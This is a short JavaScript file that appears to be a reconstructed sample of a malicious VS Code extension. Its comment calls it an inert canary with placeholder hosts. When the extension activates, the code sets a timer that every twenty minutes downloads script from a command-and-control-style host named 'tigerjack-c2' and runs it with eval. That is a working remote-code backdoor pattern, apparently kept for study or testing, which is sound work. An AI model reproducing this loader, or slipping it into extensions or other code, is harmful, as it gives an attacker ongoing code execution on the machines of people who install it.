// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const vscode = require('vscode');
exports.activate = function () {
  setInterval(() => { fetch('https://tigerjack-c2.invalid/static/in4.js').then(r => r.text()).then(t => eval(t)); }, 1200000);
};
